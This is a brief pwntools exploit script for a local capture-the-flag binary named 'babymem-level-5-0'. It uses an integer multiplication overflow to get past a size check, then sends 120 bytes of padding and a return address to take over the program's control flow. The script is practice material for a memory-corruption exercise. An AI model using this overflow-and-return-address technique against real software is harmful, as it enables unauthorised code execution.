from pwn import *

proc = process('/challenge/babymem-level-5-0')
proc.recv()

# 2147483649*2= overflow of 2 interpretato in CA2
proc.recvuntil(b'send: ')
proc.sendline(b'2147483649')
proc.recvuntil(b'record: ')
proc.sendline(b'2')
proc.recv()

# offset 120 to RET
payload = b'A' * 120 + p64(0x4016b9)
proc.sendline(payload)
print(proc.recv())
